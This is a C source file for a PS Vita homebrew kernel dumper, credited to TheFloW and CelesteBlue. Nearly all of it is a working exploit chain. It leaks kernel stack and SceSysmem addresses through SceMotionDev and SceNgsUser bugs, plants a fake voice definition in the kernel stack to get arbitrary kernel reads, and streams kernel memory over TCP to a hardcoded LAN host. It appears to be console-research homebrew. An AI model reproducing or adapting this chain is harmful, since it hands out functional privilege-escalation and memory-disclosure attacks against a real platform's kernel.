#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>
#include <malloc.h>

#include <psp2/ctrl.h>
#include <psp2/apputil.h>
#include <psp2/appmgr.h>
#include <psp2/io/dirent.h>
#include <psp2/io/fcntl.h>
#include <psp2/io/stat.h>
#include <psp2/io/devctl.h>
#include <psp2/kernel/threadmgr.h>
#include <psp2/kernel/processmgr.h>
#include <psp2/kernel/modulemgr.h>
#include <psp2/sysmodule.h>
#include <psp2/net/net.h>
#include <psp2/net/netctl.h>

#include "debugScreen.h"

#define PC_IP_FOR_SOCKET "192.168.0.20"


static unsigned buttons[] = {
	SCE_CTRL_SELECT,
	SCE_CTRL_START,
	SCE_CTRL_UP,
	SCE_CTRL_RIGHT,
	SCE_CTRL_DOWN,
	SCE_CTRL_LEFT,
	SCE_CTRL_LTRIGGER,
	SCE_CTRL_RTRIGGER,
	SCE_CTRL_TRIANGLE,
	SCE_CTRL_CIRCLE,
	SCE_CTRL_CROSS,
	SCE_CTRL_SQUARE,
};

int get_key(void)
{
	static unsigned prev = 0;
	SceCtrlData pad;
	while (1) {
		memset(&pad, 0, sizeof(pad));
		sceCtrlPeekBufferPositive(0, &pad, 1);
		unsigned new = prev ^ (pad.buttons & prev);
		prev = pad.buttons;
		for (int i = 0; i < sizeof(buttons)/sizeof(*buttons); ++i)
			if (new & buttons[i])
				return buttons[i];

		sceKernelDelayThread(1000); // 1ms
	}
}

void menu(void)
{
	psvDebugScreenClear(COLOR_BLACK);
	psvDebugScreenSetFgColor(COLOR_WHITE);
	printf("PSVita Kernel dumper by TheFloW - modded by CelesteBlue\n");
	printf("========================\n");
	printf("\n");
	printf("Press CROSS to test network socket.\n");
	printf("Press SQUARE to bruteforce kernel.\n");
	printf("Press TRIANGLE to dump kernel ;-)\n");
	printf("Press CIRCLE to exit.\n");
	printf("\n");
}


///////////// KERNEL EXPLOITS /////////////

int sceMotionDevGetEvaInfo(void *info);
int sceNgsVoiceDefinitionGetPresetInternal(void *src, int pos, void *out);

typedef struct { // size = 0x16 * sizeof(int) = 0x58
	uint32_t sysmem_seg0_addr;
	uint32_t kdump_start_offset;
	uint32_t leaked_sysmem_addr;
	uint32_t leaked_kstack_addr;
	uint32_t leaked_info[0x12];
} kdump_info;

char buffer[0x1000];
uint32_t info[0x12];
uint32_t leaked_kstack_addr = 0;
uint32_t leaked_sysmem_addr = 0;
uint32_t sysmem_seg0_addr = 0;


#define SCE_NGS_VOICE_DEFINITION_XOR   0x9e28dcce
#define SCE_NGS_VOICE_DEFINITION_MAGIC 0x66647662
#define SCE_NGS_VOICE_DEFINITION_FLAGS 0x00010001
#define SCE_NGS_ERROR_INVALID_PARAM    0x804a0002

typedef struct SceNgsSystemInitParams
{
    SceInt32 nMaxRacks;      /* Maximum number of Racks within the Stage */
    SceInt32 nMaxVoices;     /* Maximum number of active voices */
    SceInt32 nGranularity;   /* PCM sample granularity (NGS will process and output PCM sample packets of this size) */
    SceInt32 nSampleRate;    /* Base sample rate */
    SceInt32 nMaxModules;    /* Maximum number of module types which are available for the whole system. */
} SceNgsSystemInitParams;

typedef uint32_t SceNgsHSynSystem;

typedef struct SceNgsRackDescription
{
    const struct SceNgsVoiceDefinition* pVoiceDefn;     /* Pointer to Voice Definition information */
    SceInt32    nVoices;                                /* Maximum number of Voices within the Rack */
    SceInt32    nChannelsPerVoice;                      /* Maximum number of audio channels for each voice (1=Mono, 2=Stereo) */
    SceInt32    nMaxPatchesPerInput;                    /* Maximum number of Voices (processed from other Racks) which can be patched to each input */
    SceInt32    nPatchesPerOutput;                      /* Maximum patches from each Voice output */
    void*       pUserReleaseData;                       /* Pointer to user release data (when callback release method used) */
} SceNgsRackDescription;

typedef struct {
    void *data;
    uint32_t size;
} SceNgsBufferInfo;

typedef uint32_t SceNgsHRack;

/******************************************************************************************
SYSTEM COMMANDS (init, release, update)
******************************************************************************************/
SceInt32 sceNgsSystemGetRequiredMemorySize( const SceNgsSystemInitParams* pSynthParams, uint32_t* pnSize );
SceInt32 sceNgsSystemInit( void* pSynthSysMemory, const uint32_t uMemSize, const SceNgsSystemInitParams* pSynthParams, SceNgsHSynSystem* pSystemHandle );
SceInt32 sceNgsSystemRelease( SceNgsHSynSystem hSystemHandle );

/******************************************************************************************
RACK COMMANDS
******************************************************************************************/
SceInt32 sceNgsRackGetRequiredMemorySize( SceNgsHSynSystem hSystemHandle, const SceNgsRackDescription* pRackDesc, uint32_t* pnSize );
SceInt32 sceNgsRackInit( SceNgsHSynSystem hSystemHandle, SceNgsBufferInfo* pRackBuffer, const SceNgsRackDescription* pRackDesc, SceNgsHRack* pRackHandle );
SceInt32 sceNgsRackRelease( SceNgsHRack hRackHandle, void* callbackFuncPtr );


uint32_t voiceDef[0x100];
uint32_t paramsize;
SceNgsHSynSystem s_sysHandle;
SceNgsRackDescription rackDesc;

int init_ngsuser(void) {
	uint32_t ret = 0;
	
	SceAppUtilInitParam initParam;
	SceAppUtilBootParam bootParam;
	memset( &initParam, 0, sizeof(SceAppUtilInitParam) );
	memset( &bootParam, 0, sizeof(SceAppUtilBootParam) );
	ret = sceAppUtilInit( &initParam, &bootParam );
	printf("sceAppUtilInit() returned 0x%08x\n", ret);
	//ret = sceSysmoduleUnloadModule(SCE_SYSMODULE_NGS);
	//printf("sceSysmoduleUnloadModule() returned 0x%08x\n", ret);
	ret = sceSysmoduleLoadModule(SCE_SYSMODULE_NGS);
	printf("sceSysmoduleLoadModule() returned 0x%08x\n", ret);
	
	SceNgsSystemInitParams initParams;
	initParams.nMaxRacks    = 2;
	initParams.nMaxVoices   = 2;
	initParams.nGranularity = 512;
	initParams.nSampleRate  = 48000;
	initParams.nMaxModules  = 1;
	
	printf("sceNgsSystemGetRequiredMemorySize() returned 0x%x\n", sceNgsSystemGetRequiredMemorySize(&initParams, &paramsize));
	static void *s_pSysMem;
	s_pSysMem = memalign(256, paramsize);
	printf("sceNgsSystemInit() returned 0x%x\n", ret = sceNgsSystemInit(s_pSysMem, paramsize, &initParams, &s_sysHandle));
	
	rackDesc.nChannelsPerVoice   = 1;
	rackDesc.nVoices             = 1;
	rackDesc.nMaxPatchesPerInput = 0;
	rackDesc.nPatchesPerOutput   = 0;
	memset(voiceDef, 0, 0x400);
	voiceDef[0] = SCE_NGS_VOICE_DEFINITION_MAGIC;
	voiceDef[1] = SCE_NGS_VOICE_DEFINITION_FLAGS;
	voiceDef[2] = 0x40;
	voiceDef[3] = 0x40;
	
	return ret;
}

int leak_kstack_ngsuser(void) { // Coded by LemonHaze from TheFloW's ROP code
	uint32_t ret = 0;
	
	// Write voiceDef to kstack
	sceIoDevctl("", 0, voiceDef, 0x3FF, NULL, 0);
	
	// Find kstack address by searching the voiceBuf in kernel memory
	
	// for recent FWs for exemple 3.60
	for (uint32_t addr = 0x01800000; addr < 0x03000000; addr += 2) {
		rackDesc.pVoiceDefn = (const struct SceNgsVoiceDefinition*) (addr ^ SCE_NGS_VOICE_DEFINITION_XOR);
		ret = sceNgsRackGetRequiredMemorySize(s_sysHandle, &rackDesc, &paramsize);
		if (ret == SCE_NGS_ERROR_INVALID_PARAM)
			continue;
		else
			return addr & 0xFFFFF000;
	}
	
	// for old FWs for exemple 1.692
	for (uint32_t addr = 0; addr < 0x03000000; addr += 2) {
		rackDesc.pVoiceDefn = (struct SceNgsVoiceDefinition*)addr;
		ret = sceNgsRackGetRequiredMemorySize(s_sysHandle, &rackDesc, &paramsize);
		if (ret == SCE_NGS_ERROR_INVALID_PARAM)
			continue;
		else
			return addr & 0xFFFFF000;
	}
	
	return 0xFFFF;
}

#define PRESET_LIST_OFFSET 0x130
#define FAKE_COPYOUT_OFFSET 0x40
#define FAKE_COPYOUT_SIZE 0xA0
#define COPYOUT_PARAMS_OFFSET 0xA0

#define KSTACK_SYSMEM_OFFSET -0x89C
#define SCE_SYSMEM_OFFSET -0x1697


void trigger_exploit(void) {
	SceNgsBufferInfo buffer_info;
	SceNgsHRack rack_handle;
	
	// Plant fake voice definition into kernel stack
	sceIoDevctl("", 0, voiceDef, 0x3ff, NULL, 0);

	// Determine memory requirement for rack
	sceNgsRackGetRequiredMemorySize(s_sysHandle, &rackDesc, &(buffer_info.size));

	// Allocate rack memory
	buffer_info.data = memalign(256, buffer_info.size);
	
	// Call vulnerable function
	sceNgsRackInit(s_sysHandle, &buffer_info, &rackDesc, &rack_handle);
	
	// Free rack memory
	free(buffer_info.data);
	
	// Release rack handle
	sceNgsRackRelease(rack_handle, NULL);
}

void set_preset(uint32_t i, uint32_t src, uint32_t size) {
	uint32_t index = i*0x18;
	uint32_t offset = src - (PRESET_LIST_OFFSET + index);
	memset((void *)&(voiceDef[(PRESET_LIST_OFFSET + index)/sizeof(uint32_t)]), 0, 0x18);
	voiceDef[(PRESET_LIST_OFFSET + index + 0x08)/sizeof(uint32_t)] = offset; // nPresetDataOffset
	voiceDef[(PRESET_LIST_OFFSET + index + 0x0c)/sizeof(uint32_t)] = size; // uSizePresetData
}

int leak_sysmem_ngsuser(uint32_t kstack_addr) {
	uint32_t ret = 0;
	
	// Write voiceDef to kstack
	sceIoDevctl("", 0, voiceDef, 0x3FF, NULL, 0);
	// for recent FWs for exemple 3.60
	for (uint32_t addr = kstack_addr; addr < 0x03000000; addr += 2) {
		rackDesc.pVoiceDefn = (struct SceNgsVoiceDefinition*) (addr ^ SCE_NGS_VOICE_DEFINITION_XOR);
		ret = sceNgsRackGetRequiredMemorySize(s_sysHandle, &rackDesc, &paramsize);
		if (ret != SCE_NGS_ERROR_INVALID_PARAM) {
			printf("found voiceDef in kstack\n");
			break;
		}
	}
	if (ret == SCE_NGS_ERROR_INVALID_PARAM) { // for old FWs for exemple 1.692
		for (uint32_t addr = kstack_addr; addr < 0x03000000; addr += 2) {
			rackDesc.pVoiceDefn = (struct SceNgsVoiceDefinition*)addr;
			ret = sceNgsRackGetRequiredMemorySize(s_sysHandle, &rackDesc, &paramsize);
			if (ret != SCE_NGS_ERROR_INVALID_PARAM) {
				printf("found voiceDef in kstack\n");
				break;
			}
		}
	}
	
	// Set presets information in voice definition
	voiceDef[0x30/sizeof(uint32_t)] = PRESET_LIST_OFFSET;
	voiceDef[0x34/sizeof(uint32_t)] = 2;
	
	// Set presets
	set_preset(0, 0, -(0x148 + 2 * 0x18) + COPYOUT_PARAMS_OFFSET);
	set_preset(1, FAKE_COPYOUT_OFFSET, FAKE_COPYOUT_SIZE);
	
	uint32_t sysmem_base = 0;
	
	// Overwrite copyout's dst, src and len
	memset((void *)&(voiceDef[FAKE_COPYOUT_OFFSET/sizeof(uint32_t)]), 0, FAKE_COPYOUT_SIZE);
	voiceDef[(FAKE_COPYOUT_OFFSET + 0x04)/sizeof(uint32_t)] = (uint32_t)&sysmem_base; // dst
	voiceDef[(FAKE_COPYOUT_OFFSET + 0x08)/sizeof(uint32_t)] = kstack_addr - KSTACK_SYSMEM_OFFSET; // src
	voiceDef[(FAKE_COPYOUT_OFFSET + 0x1c)/sizeof(uint32_t)] = 4; // len
	
	// Trigger exploit
	trigger_exploit();

	// Resolve SceSysmem seg0 base address
	printf("sysmem leak: %08X\n", sysmem_base);
	printf("sysmem slided using 3.65-3.68 value (valid on 3.65-3.68): %08X\n", sysmem_base + SCE_SYSMEM_OFFSET);
	printf("sysmem masked (valid): %08X\n", sysmem_base & 0xFFFF0000);
	
	return sysmem_base & 0xFFFF0000; // Sysmem resolving for any FW, method found by CelesteBlue
}

int leak_kstack_motiondev() {
	int ret;
	
	// 1) Call a function that writes sp to kernel stack
	sceAppMgrLoadExec(NULL, NULL, NULL);
	//printf("appmgr works ;)\n");
	//sceKernelDelayThread(10 * 1000 * 1000);

	// 2) Leak kernel stack
	ret = sceMotionDevGetEvaInfo(info);
	if (ret < 0)
		printf("sceMotionDevGetEvaInfo: 0x%08X\n");

	// 3) Get kernel stack address
	return info[3] & 0xFFFFF000;
}

int leak_sysmem_motiondev() {
	int ret;
	
	// 1) Call a function that writes sp to kernel stack
	sceAppMgrLoadExec(NULL, NULL, NULL);
	//printf("appmgr works ;)\n");
	//sceKernelDelayThread(10 * 1000 * 1000);

	// 2) Leak kernel stack
	ret = sceMotionDevGetEvaInfo(info);
	if (ret < 0)
		printf("sceMotionDevGetEvaInfo: 0x%08X\n");

	// 3) Get kernel sysmem address
	return (info[0] - 0x27000) & 0xFFFF0000; // Sysmem resolving for any FW, method found by CelesteBlue
}

int kernel_read_ngs_word(void *dst, void *src) {
	uint32_t kstack_devctl_inbuf_addr = leaked_kstack_addr + 0xAF0 - 0x30;

	// 1) Write data into kernel stack
	uint32_t inbuf[2];
	inbuf[0] = (uint32_t)src - kstack_devctl_inbuf_addr;
	inbuf[1] = 0xFFFFFFFF;
	sceIoDevctl("", 0, inbuf, sizeof(inbuf), NULL, 0);

	// 2) Read kernel
	return sceNgsVoiceDefinitionGetPresetInternal((void *)kstack_devctl_inbuf_addr, 0, dst);
}

void kernel_read_ngs(void *dst, void *src, uint32_t size) {
	for (uint32_t i = 0; i < size; i += 4)
		kernel_read_ngs_word(dst + i, src + i);
}

void kernel_read_ngsuser(void *dst, void *src, uint32_t size) {
	uint32_t ret = 0;
	
	// Write voiceDef to kstack
	sceIoDevctl("", 0, voiceDef, 0x3FF, NULL, 0);
	// for recent FWs for exemple 3.60
	for (uint32_t addr = leaked_kstack_addr; addr < 0x03000000; addr += 2) {
		rackDesc.pVoiceDefn = (struct SceNgsVoiceDefinition*) (addr ^ SCE_NGS_VOICE_DEFINITION_XOR);
		ret = sceNgsRackGetRequiredMemorySize(s_sysHandle, &rackDesc, &paramsize);
		if (ret != SCE_NGS_ERROR_INVALID_PARAM) {
			printf("found voiceDef in kstack\n");
			break;
		}
	}
	if (ret == SCE_NGS_ERROR_INVALID_PARAM) { // for old FWs for exemple 1.692
		for (uint32_t addr = leaked_kstack_addr; addr < 0x03000000; addr += 2) {
			rackDesc.pVoiceDefn = (struct SceNgsVoiceDefinition*)addr;
			ret = sceNgsRackGetRequiredMemorySize(s_sysHandle, &rackDesc, &paramsize);
			if (ret != SCE_NGS_ERROR_INVALID_PARAM) {
				printf("found voiceDef in kstack\n");
				break;
			}
		}
	}
	
	// Set presets information in voice definition
	voiceDef[0x30/sizeof(uint32_t)] = PRESET_LIST_OFFSET;
	voiceDef[0x34/sizeof(uint32_t)] = 2;
	
	// Set presets
	set_preset(0, 0, -(0x148 + 2 * 0x18) + COPYOUT_PARAMS_OFFSET);
	set_preset(1, FAKE_COPYOUT_OFFSET, FAKE_COPYOUT_SIZE);
	
	// Overwrite copyout's dst, src and len
	memset((void *)&(voiceDef[FAKE_COPYOUT_OFFSET/sizeof(uint32_t)]), 0, FAKE_COPYOUT_SIZE);
	voiceDef[(FAKE_COPYOUT_OFFSET + 0x04)/sizeof(uint32_t)] = (uint32_t)dst; // dst
	voiceDef[(FAKE_COPYOUT_OFFSET + 0x08)/sizeof(uint32_t)] = (uint32_t)src; // src
	voiceDef[(FAKE_COPYOUT_OFFSET + 0x1c)/sizeof(uint32_t)] = size; // len
	
	// Trigger exploit
	trigger_exploit();
}


////////// NETWORK ////////////////

static int _dbgsock = 0;
static void *net_memory = NULL;

void init_netdbg()
{
	#define NET_INIT_SIZE 1*1024*1024
	SceNetSockaddrIn server;
	
	int retu = sceSysmoduleLoadModule(SCE_SYSMODULE_NET);
	if (retu < 0) {
		printf("[SAMPLE] %s,%d ret=%x\n", __FUNCTION__, __LINE__, retu);
	}

	if (sceNetShowNetstat() == SCE_NET_ERROR_ENOTINIT) {
		net_memory = malloc(NET_INIT_SIZE);

		SceNetInitParam initparam;
		initparam.memory = net_memory;
		initparam.size = NET_INIT_SIZE;
		initparam.flags = 0;

		sceNetInit(&initparam);
		sceKernelDelayThread(100*1000);
	}

	server.sin_len = sizeof(server);
	server.sin_family = SCE_NET_AF_INET;
	sceNetInetPton(SCE_NET_AF_INET, PC_IP_FOR_SOCKET, &server.sin_addr);
	server.sin_port = sceNetHtons(9023);
	memset(server.sin_zero, 0, sizeof(server.sin_zero));

	_dbgsock = sceNetSocket("vitanetdbg", SCE_NET_AF_INET, SCE_NET_SOCK_STREAM, 0);
	sceNetConnect(_dbgsock, (SceNetSockaddr *)&server, sizeof(server));
}

void fini_netdbg()
{
	if (_dbgsock) {
		sceNetSocketClose(_dbgsock);
		sceNetTerm();
		if (net_memory) {
			free(net_memory);
			net_memory = NULL;
		}
		_dbgsock = 0;
	}
}

void debug(char *text, ...)
{
	va_list list;
	char string[512];

	va_start(list, text);
	vsprintf(string, text, list);
	va_end(list);

	sceNetSend(_dbgsock, string, strlen(string), 0);
}

int net_send_buffer(char *buffer, unsigned int size){
	return sceNetSend(_dbgsock, buffer, size, 0);
}

char outbuf[0x400];
char device_name[0x10];
char command[0x10];

int main(void) {
	int ret = -1;
	int key = 0;
	int idx;
	int done = 0;
	int madd = 0, mrem = 0;
	
	psvDebugScreenInit();
	printf("printf working! Press X to continue.\n");
	do { key = get_key(); } while (key != SCE_CTRL_CROSS);
	printf("ctrl working!\n");
	sceKernelDelayThread(1 * 1000 * 1000);
	
	printf("leaked_kstack_addr by SceMotionDev: %08X\n", leaked_kstack_addr = leak_kstack_motiondev());
	printf("leaked_sysmem_addr by SceMotionDev: %08X\n", leaked_sysmem_addr = leak_sysmem_motiondev());
	
	init_ngsuser();
	if (leaked_kstack_addr == 0) // if SceMotionDev exploit failed, lets use SceNgsUser
		printf("leaked_kstack_addr by SceNgsUser: %08X\n", leaked_kstack_addr = leak_kstack_ngsuser());
	printf("leaked_sysmem_addr by SceNgsUser: %08X\n", leak_sysmem_ngsuser(leaked_kstack_addr));
	
	printf("Press X to continue.\n");
	do { key = get_key(); } while (key != SCE_CTRL_CROSS);
	
	sceKernelDelayThread(500 * 1000);
	
	while (!done) {
		menu();
		key = get_key();
		switch (key) {
		case SCE_CTRL_CROSS:
			menu();
			
			init_netdbg();
			debug("coucou\n");
			memset(buffer, 'z', 0x1000);
			net_send_buffer(buffer, 0x1000);
			printf("fini\n");
			fini_netdbg();
			
			psvDebugScreenSetFgColor(COLOR_GREEN);
			printf("Done.\n");
			psvDebugScreenSetFgColor(COLOR_WHITE);
			printf("Press a button to continue.\n");
			get_key();
			break;
			
		case SCE_CTRL_SELECT:
			menu();
			printf("Test kstack leak\n");
			
			// int sceIoDevctl(const char *dev, unsigned int cmd, void *indata, int inlen, void *outdata, int outlen);
			memset(outbuf, 0x66, 0x400); // write dummy data to recognize the buffer
			
			ret = sceIoOpen("molecule0:", 0, 0); // sceIoOpen to populate kernel stack
			//ret = sceAppMgrLoadExec(NULL, NULL, NULL);
			printf("sceIoOpen ret: %08X\n", ret);
			
			ret = sceIoDevctl("", 0, outbuf, 0x3FF, NULL, 0); // this will push our buffer to the stack..
			printf("sceIoDevctl ret: %08X\n", ret);
			// now the buffer is on the stack, let's clear it locally..
			memset(outbuf, 0x00, 0x400);
			
			//strcat(device_name, "sdstor0:");
			//strcat(command, "gcd-lp-ign-gamero");
			//strcat(command, "xmc-lp-ign-userext");
			
			ret = sceIoDevctl("sdstor0:", 5, "gcd-lp-ign-gamero", 0x14, &outbuf, 0x3FF);
			printf("sceIoDevctl ret: %08X\n", ret);
			
			
			sceKernelDelayThread(3 * 1000 * 1000);
			for (uint32_t e=0; e < 0x400; e+=sizeof(uint32_t)) {
				printf("%08X\n", ((uint32_t *)outbuf)[e/sizeof(uint32_t)]);
				sceKernelDelayThread(100 * 1000);
			}
			sceKernelDelayThread(3 * 1000 * 1000);
			
			init_netdbg();
			net_send_buffer(outbuf, sizeof(outbuf));
			fini_netdbg();
			break;
			
		case SCE_CTRL_SQUARE:
			menu();
			printf("Bruteforcing kernel dumping range\n");
			init_netdbg();
			
			// Read sysmem
			void *addr = (void *)(leaked_sysmem_addr - 0x1000);
			for (uint32_t i = 0; i < (0x10000000/0x1000); i++) {
				kernel_read_ngs(buffer, addr, 0x1000);
				debug("dumpable address: %08X", addr);
				addr += 0x1000;
			}
			
			fini_netdbg();
			break;
			
		case SCE_CTRL_TRIANGLE:
			menu();
			printf("Dumping kernel\n");
			
			init_netdbg();
			
			const char sysmem_module_entrypoint_magic[] = {0x07, 0x00, 0x01, 0x01, 0x53, 0x63, 0x65, 0x53, 0x79, 0x73, 0x6D, 0x65, 0x6D, 0x00};
			
			sysmem_seg0_addr = leaked_sysmem_addr;
			
			// Search SceSysmem entrypoint in kernel
			printf("Bruteforcing SceSysmem seg0 base address\n");
			uint32_t i = 0;
			int exit = 0;
			while (!exit) {
				memset(buffer, 0, 0x1000);
				kernel_read_ngsuser(&buffer, (void * )(leaked_sysmem_addr+i*0x1000), 0x1000);
				for (int j=0; j < 0x1000; j++) {
					if (!memcmp(buffer+j, sysmem_module_entrypoint_magic, sizeof(sysmem_module_entrypoint_magic))) {
						sysmem_seg0_addr = leaked_sysmem_addr+i*0x1000+j;
						debug("found magic !!!!!\n0x%08X\n", sysmem_seg0_addr);
						printf("found magic !!!!!\n0x%08X\n", sysmem_seg0_addr);
						exit = 1;
						break;
					}
				}
				printf("looping...\n");
				sceKernelDelayThread(500 * 1000);
				i++;
			}
			
			sysmem_seg0_addr = (sysmem_seg0_addr - 0x24750) & 0xFFFFF000;
			printf("sysmem_seg0_addr: %08X\n", sysmem_seg0_addr);
			sceKernelDelayThread(10*1000*1000);
			
			uint32_t delta_sub = 0;
			
			kdump_info kinfo;
			memset((void *)&kinfo, 0, sizeof(kinfo));
			kinfo.sysmem_seg0_addr = sysmem_seg0_addr;
			kinfo.kdump_start_offset = sizeof(kinfo) + delta_sub;
			kinfo.leaked_sysmem_addr = leaked_sysmem_addr;
			kinfo.leaked_kstack_addr = leaked_kstack_addr;
			memcpy(kinfo.leaked_info, info, sizeof(info));
			net_send_buffer((char *)&kinfo, sizeof(kinfo));
			printf("kernel dump infos buffer sent");
			
			printf("Start dumping kernel...\n");
			// Dump kernel
			for (uint32_t i = 0; i < (0x65+0xD2+0x100); i++) {
				memset(buffer, 0, 0x1000);
				sceKernelDelayThread(50 * 1000);
				kernel_read_ngsuser(&buffer, (void*)(sysmem_seg0_addr+i*0x1000-delta_sub), 0x1000);
				ret = net_send_buffer(buffer, 0x1000);
				if (ret >= 0)
					printf("write res: %08X - addr: %08X - delta: %X\n", ret, sysmem_seg0_addr+i*0x1000-delta_sub, sysmem_seg0_addr+i*0x1000-delta_sub-leaked_sysmem_addr);
				else {
					printf("error sending buffer: %08X\n", ret);
					init_netdbg();
					i--;
				}
			}
			
			fini_netdbg();
			psvDebugScreenSetFgColor(COLOR_GREEN);
			printf("Done.\n");
			psvDebugScreenSetFgColor(COLOR_WHITE);
			printf("Press a button to continue.\n");
			get_key();
			break;
		
		case SCE_CTRL_CIRCLE:
			done = 1;
			break;

		default:
			break;
		}
	}

	return 0;
}
